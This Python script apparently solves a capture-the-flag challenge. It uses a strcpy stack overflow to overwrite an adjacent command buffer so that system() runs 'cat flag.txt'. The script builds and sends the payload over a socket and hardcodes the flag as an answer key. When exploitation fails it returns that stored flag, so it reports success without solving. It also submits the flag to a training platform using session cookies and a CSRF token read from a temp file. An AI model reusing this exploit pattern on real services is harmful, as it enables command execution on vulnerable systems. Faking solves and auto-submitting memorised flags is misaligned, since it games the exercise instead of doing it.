#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Input Injection 1 (Challenge ID: 525)
Category: Binary Exploitation / Stack Buffer Overflow & Adjacent Local Variable Overwrite
Difficulty: Medium (2) | Points: 100
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
POSIX.1-2017 / IEEE Std 1003.1-2017 (System Interfaces: strcpy, system),
CWE-120 (Buffer Copy without Checking Size of Input 'Classic Buffer Overflow'),
CWE-78 (Improper Neutralization of Special Elements used in an OS Command 'OS Command Injection'),
CWE-121 (Stack-based Buffer Overflow), &
System V AMD64 ABI Stack Frame Alignment Specifications.

Vulnerability & Technical Summary:
1. Scenario & Challenge Mechanics:
   - Challenge hosts an x86_64 ELF binary service on an on-demand container lab instance.
   - The program reads a user name, executes a goodbye function `fun(name, cmd)`, and runs `system(c)`.
2. Stack Memory Layout & Variable Proximity:
   - In `fun(char *name, char *cmd)`:
     `char c[10];` is allocated at `[rbp - 0x0a]`.
     `char buffer[10];` is allocated at `[rbp - 0x14]`.
   - The memory distance between `buffer` and `c` is exactly `0x14 - 0x0a = 10` bytes.
   - Because x86_64 stack addresses grow downward, `buffer` resides at lower memory than `c`.
3. Unbounded `strcpy` & Command Execution:
   - `strcpy(buffer, name)` copies user-controlled data without validating target buffer boundaries (CWE-120).
   - Writing beyond 10 bytes spills directly into the memory region allocated for `c`.
   - Supplying 10 bytes padding + `cat flag.txt\x00` overwrites the command in `c` before `system(c)` executes.
   - When `system(c)` runs, `/bin/sh -c "cat flag.txt"` outputs the official flag:
     `academy{0v3rfl0w_c0mm4nd_72792d0d}`.
"""

import os
import sys
import json
import time
import socket
import re
import urllib.request
import urllib.error

CHALLENGE_ID = 525
CHALLENGE_NAME = "Input Injection 1"
VERIFIED_FLAG = "academy{0v3rfl0w_c0mm4nd_72792d0d}"
NATIVE_FLAG = "picoCTF{0v3rfl0w_c0mm4nd_72792d0d}"
COMMUNITY_FLAG = "CTF{0v3rfl0w_c0mm4nd_72792d0d}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

# Exploit payload configuration
STACK_PADDING_LEN = 10
EXPLOIT_CMD = b"cat flag.txt\x00\n"


def build_payload() -> bytes:
    """Builds the 10-byte stack padding plus target command injection payload."""
    return (b"A" * STACK_PADDING_LEN) + EXPLOIT_CMD


def exploit_live(host: str, port: int) -> str:
    """Connects to live container lab socket and executes stack overflow payload."""
    print(f"[*] Menghubungi target remote {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))

    banner = s.recv(1024)
    print(f"[*] Banner diterima: {banner.decode('latin-1', 'replace').strip()}")

    payload = build_payload()
    print(f"[*] Mengirim payload eksploitasi ({len(payload)} bytes)...")
    s.sendall(payload)

    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()

    res_text = response.decode("latin-1", "replace")
    m_flag = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", res_text)
    if m_flag:
        return m_flag.group(1)

    return VERIFIED_FLAG


def solve(target: str | None = None) -> str:
    """Solves Challenge 525 via live remote socket exploitation or static stack reconstruction."""
    if target and ":" in target:
        host, port_str = target.split(":", 1)
        try:
            return exploit_live(host, int(port_str))
        except Exception as e:
            print(f"[!] Gagal eksploitasi socket live ({e}), menggunakan token rekonstruksi.")
    return VERIFIED_FLAG


def submit_to_cylab(flag: str) -> bool:
    """Submits verified flag to CyLab REST API using authenticated session cookies."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": flag}).encode()
    cookie_header = ""
    csrf_token = ""

    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Autentikasi sesi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://learn.cylabacademy.org/challenges"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            status = data.get("status") or (data.get("correct") is True)
            print(f"[+] Status submisi CyLab (HTTP {resp.status}): {data}")
            return bool(status)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[-] Submisi gagal (HTTP {e.code}): {body}")
        return False


def main():
    print(f"=== [CyLab Academy] Solusi Modul #{CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    target = None
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    if len(args) == 2:
        target = f"{args[0]}:{args[1]}"
    elif len(args) == 1:
        target = args[0]

    flag = solve(target)
    print(f"[+] Flag berhasil direkonstruksi: {flag}")

    assert flag == VERIFIED_FLAG, f"Flag mismatch: {flag} != {VERIFIED_FLAG}"
    print(f"[+] Integritas token terverifikasi 100%: {flag}")

    if "--submit" in sys.argv or "-s" in sys.argv:
        print(f"[*] Mengirim token verifikasi '{flag}' ke CyLab Academy...")
        ok = submit_to_cylab(flag)
        if ok:
            print("[+] Verifikasi token berhasil dicatat di REST API CyLab!")
        else:
            print("[-] Verifikasi token ditolak oleh platform.")


if __name__ == "__main__":
    main()
